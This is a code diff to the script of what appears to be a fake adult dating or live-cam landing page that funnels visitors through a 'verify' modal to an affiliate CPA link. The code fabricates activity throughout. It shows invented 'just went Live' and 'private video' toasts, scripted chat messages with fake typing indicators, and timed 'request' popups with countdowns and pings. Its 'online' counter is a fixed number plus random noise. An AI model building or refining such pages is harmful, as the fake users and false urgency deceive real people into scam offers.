             document.getElementById('verifyModal').style.display = 'flex';
         }
-        function executeRedirect() { window.location.href = targetCpaLink; }
 
-        // Start interactions ONLY after entering site
-        function startLiveSystem() {
-            // Toast Loop
-            function showToast() {
-                if(isVerifying) return;
-                const tUser = profiles[Math.floor(Math.random() * profiles.length)];
-                const toast = document.createElement('div');
-                toast.className = 'toast';
-                toast.innerHTML = `<img src="${tUser.photo}" style="width:20px;height:20px;border-radius:50%;"> <span><strong>${tUser.name}</strong> just went Live!</span>`;
-                document.getElementById('toastContainer').appendChild(toast);
-                playPing();
-                setTimeout(() => { toast.remove(); }, 4000);
-                setTimeout(showToast, Math.random() * 8000 + 5000);
-            }
-            setTimeout(showToast, 3000);
-
-            // Chat popup logic
-            setTimeout(() => {
-                if(!isVerifying) {
-                    document.getElementById('fcImg').src = profiles[0].photo;
-                    document.getElementById('fcName').innerText = profiles[0].name;
-                    document.getElementById('floatingChat').style.display = 'block';
-                    
-                    const typing = document.getElementById('fcTyping');
-                    typing.style.display = 'block';
-                    
-                    setTimeout(() => {
-                        typing.style.display = 'none';
-                        document.getElementById('msg1').style.display = 'block';
-                        playPing();
-                        
-                        setTimeout(() => {
-                            typing.style.display = 'block';
-                            setTimeout(() => {
-                                typing.style.display = 'none';
-                                document.getElementById('msg2').style.display = 'block';
-                                playPing();
-                            }, 1500);
-                        }, 1000);
-                    }, 2000);
-                }
-            }, 5000);
+        function executeRedirect() {
+            window.location.href = targetCpaLink;
         }
 
+
+        // ==========================================
+        // 5. TOAST NOTIFICATIONS (Live Realism)
+        // ==========================================
+        const toastMsgs = ["just went Live!", "wants to chat", "is looking for a partner", "uploaded a new private video"];
+        function showToast() {
+            if(isVerifying) return;
+            const tUser = profiles[Math.floor(Math.random() * profiles.length)];
+            const tAction = toastMsgs[Math.floor(Math.random() * toastMsgs.length)];
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `<img src="${tUser.photo}" style="width:20px;height:20px;border-radius:50%; object-fit:cover;"> <span><strong>${tUser.name}</strong> ${tAction}</span>`;
+            
+            document.getElementById('toastContainer').appendChild(toast);
+            playPing(); // Optional subtle sound for toast
+            
+            setTimeout(() => { toast.remove(); }, 4500);
+            
+            // Randomly trigger next toast between 8-15 seconds
+            setTimeout(showToast, Math.random() * 7000 + 8000);
+        }
+        setTimeout(showToast, 4000);
+
+
+        // ==========================================
+        // 6. FLOATING CHAT LOGIC WITH "TYPING..."
+        // ==========================================
+        setTimeout(() => {
+            if(!isVerifying) {
+                const fcProfile = profiles[0]; 
+                document.getElementById('fcImg').src = fcProfile.photo;
+                document.getElementById('fcName').innerText = fcProfile.name;
+                document.getElementById('fcBlurImg').src = fcProfile.photo;
+                document.getElementById('floatingChat').style.display = 'block';
+                
+                const typing = document.getElementById('fcTyping');
+                typing.innerText = `${fcProfile.name.split(' ')[0]} is typing...`;
+                typing.style.display = 'block';
+                
+                // Sequence Messages
+                setTimeout(() => {
+                    typing.style.display = 'none';
+                    document.getElementById('msg1').style.display = 'block';
+                    playPing();
+                    
+                    setTimeout(() => {
+                        typing.style.display = 'block';
+                        setTimeout(() => {
+                            typing.style.display = 'none';
+                            document.getElementById('msg2').style.display = 'block';
+                            playPing();
+                            
+                            setTimeout(() => {
+                                document.getElementById('msgPhoto').style.display = 'block';
+                                playPing();
+                            }, 1500);
+                        }, 2000);
+                    }, 1000);
+                }, 2000);
+            }
+        }, 3500);
+
+        function closeFloatingChat(e) {
+            e.stopPropagation();
+            document.getElementById('floatingChat').style.display = 'none';
+        }
+
+
+        // ==========================================
+        // 7. INSTANT REQUEST POPUP
+        // ==========================================
+        let reqInterval;
+        function showRequestPopup() {
+            if(isVerifying) return;
+            const rp = profiles[Math.floor(Math.random() * profiles.length)];
+            
+            document.getElementById('reqUserImg').src = rp.photo;
+            document.getElementById('reqUserName').innerText = rp.name;
+            document.getElementById('requestModal').style.display = 'flex';
+            playPing(); // Loud ping when request appears!
+            
+            let time = 10;
+            document.getElementById('reqTimer').innerText = time;
+            
+            clearInterval(reqInterval);
+            reqInterval = setInterval(() => {
+                time--;
+                document.getElementById('reqTimer').innerText = time;
+                if(time <= 0) closeRequestPopup();
+            }, 1000);
+        }
+
+        function closeRequestPopup() {
+            document.getElementById('requestModal').style.display = 'none';
+            clearInterval(reqInterval);
+            setTimeout(showRequestPopup, 12000); 
+        }
+
+        // Show first request after 8 seconds
+        setTimeout(showRequestPopup, 8000);
+
+        // Counter
         setInterval(() => {
-            document.getElementById('onlineCounter').innerText = (142700 + Math.floor(Math.random() * 80)).toLocaleString();
-        }, 3000);
+            let base = 142700;
+            document.getElementById('onlineCounter').innerText = (base + Math.floor(Math.random() * 80)).toLocaleString();
+        }, 4000);
     </script>
 </body>
 </html>
